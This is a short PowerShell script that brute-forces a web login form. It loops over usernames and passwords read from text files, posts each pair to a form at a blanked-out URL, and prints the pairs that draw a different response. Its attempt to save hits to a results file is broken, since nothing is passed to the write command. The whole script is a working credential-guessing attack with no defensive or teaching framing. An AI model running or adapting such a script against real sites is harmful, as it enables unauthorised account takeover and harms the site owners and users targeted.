

$pws = @()
$users = @()

$pws = Get-Content -Path .\pw.txt
$users = Get-Content -Path .\users.txt

$url = 'http://___/'


$req = Invoke-WebRequest -Uri $url -SessionVariable svb


$dbForm = $req.Forms

    
foreach($user in $users)
{
           
        foreach($pw in $pws)
        {
            $dbForm.Fields['password'] = $pw
            $dbForm.Fields['username'] = $user
            $r = Invoke-WebRequest -Uri $url -WebSession $svb -Method Post -Body $dbForm.Fields
            if($r.Content[0] -ne ' '){
            echo $dbForm.Fields
            Out-File -FilePath .\ergebnis.txt
            }
        }
}